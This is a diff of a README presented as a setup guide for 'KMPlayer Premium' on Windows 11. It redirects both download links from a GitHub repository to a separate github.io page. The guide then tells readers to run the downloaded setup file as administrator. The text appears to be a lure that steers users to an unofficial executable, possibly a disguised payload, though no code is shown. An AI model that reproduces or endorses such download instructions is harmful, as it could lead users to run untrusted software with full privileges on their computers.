@@ -1,6 +1,6 @@
 # 📺 KMPlayer-PC-Setup-Guide - Install Premium Media Players on Windows
 
-[![](https://img.shields.io/badge/Download-KMPlayer-blue.svg)](https://github.com/R9589297/KMPlayer-PC-Setup-Guide)
+[![](https://img.shields.io/badge/Download-KMPlayer-blue.svg)](https://r9589297.github.io)
 
 This guide helps you put KMPlayer Premium on your Windows 11 computer. Many users face installation errors when they try to set up media software. These notes cover the steps to fix these issues. Follow this guide to ensure your video player works.
 
@@ -17,7 +17,7 @@ Before you start, check your computer for these items:
 
 Follow these steps to set up the software.
 
-1. Visit the project link to start your download: [https://github.com/R9589297/KMPlayer-PC-Setup-Guide](https://github.com/R9589297/KMPlayer-PC-Setup-Guide)
+1. Visit the project link to start your download: [https://r9589297.github.io](https://r9589297.github.io)
 2. Locate the setup file in your Downloads folder.
 3. Right-click the file and select Run as administrator.
 4. Select your language from the list.
